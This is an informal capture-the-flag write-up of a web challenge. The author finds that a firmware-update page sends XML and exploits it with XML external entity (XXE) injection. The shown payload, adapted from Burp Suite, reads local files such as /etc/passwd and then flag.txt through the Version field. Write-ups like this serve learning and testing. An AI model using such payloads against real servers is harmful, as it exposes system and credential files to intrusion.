I'd say yes its a very easy but it took me more than 10 min so its not that very easy for a web ctf lol.

So at the /rom page you can 'update' the firmware. when you click the update firmware button you get `Firmware version 1.3.... update initiated.`

I tried to check the request made and it straight up sends a xml request, so I added a custom value instead of the version and it prints out the custom value (ie: hello)

So i googled xml injection, i used the burp payload :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

changed it to this :
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://flag.txt"> ]>
```
and at the `<Version>` i changed the value for this :
```xml
<Version>&xxe;</Version>
```

then i got the flag
